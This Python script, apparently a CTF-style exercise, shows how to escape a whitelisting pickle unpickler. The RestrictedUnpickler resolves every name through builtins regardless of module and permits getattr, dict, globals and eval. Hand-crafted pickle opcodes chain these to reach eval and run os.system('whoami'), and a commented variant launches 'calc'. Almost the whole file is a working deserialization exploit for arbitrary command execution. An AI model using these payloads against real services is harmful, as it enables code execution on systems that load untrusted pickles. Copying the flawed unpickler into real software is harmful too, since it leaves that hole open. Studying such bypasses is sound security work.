import io
import pickle
import builtins


safe_modules = ["builtins","os","sys"]

safe_names = ["getattr","dict","globals","system","eval","modules"]

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        print(module,name)
        if module in safe_modules and name in safe_names:
            return getattr(builtins, name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %(module, name))
    
def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

opcode1=b'''cbuiltins
getattr
(cbuiltins
dict
S'get'
tR.
'''
# a=b"cbuiltins\ngetattr\n(cbuiltins\ngetattr\n(cbuiltins\ndict\nS\'get\'\ntR(cbuiltins\nglobals\n)RS\'__builtins__\'\ntRS\'eval\'\ntR(S\'__import__(\"os\").system(\"calc\")\'\ntR."
# print(restricted_loads(opcode1))

opcode2=b'''cbuiltins
globals
)R.
'''
# print(restricted_loads(opcode2))

opcode3=b'''cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
)RS'__builtins__'
tR.'''
# print(restricted_loads(opcode3))

print(builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins'),'eval'))
opcode=b'''cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
)RS'builtins'
tRS'eval'
tR(S'__import__("os").system("whoami")'
tR.
'''

print(restricted_loads(opcode))

# with open('1.pkl', 'wb') as file:
#     pickle.dump(a,file)

# my_object = {}